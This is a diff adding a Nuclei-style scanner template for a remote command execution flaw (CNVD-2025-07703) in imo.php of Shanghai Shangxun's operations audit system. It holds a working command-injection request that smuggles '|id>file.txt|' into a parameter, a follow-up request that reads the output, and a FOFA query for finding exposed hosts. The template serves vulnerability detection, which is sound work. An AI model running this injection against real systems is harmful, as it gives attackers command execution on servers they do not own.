@@ -1,0 +1,34 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - uid=
+            - gid=
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/imo.php?type=immediate&id=|id>{{username}}.txt| HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        - |
+          GET /api/{{username}}.txt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+id: shangxun-imo_php-RCE-CNVD-2025-07703
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/default/switchlocale" || body="default/getloginhtml"
+        上海上讯信息技术股份有限公司 运维管理审计系统 imo.php 存在远程命令执行漏洞。攻击者可以通过漏洞执行任意命令从而获取服务器权限，可能导致内网进一步被攻击。
+    name: 上海上讯信息技术股份有限公司 运维管理审计系统 imo.php 远程命令执行漏洞(CNVD-2025-07703)
+    reference:
+        - https://mp.weixin.qq.com/s/sami-yoOJF7tWteGRBpMLg
+    severity: high
+    tags: []
+variables:
+    username: '{{to_lower(rand_base(6))}}'
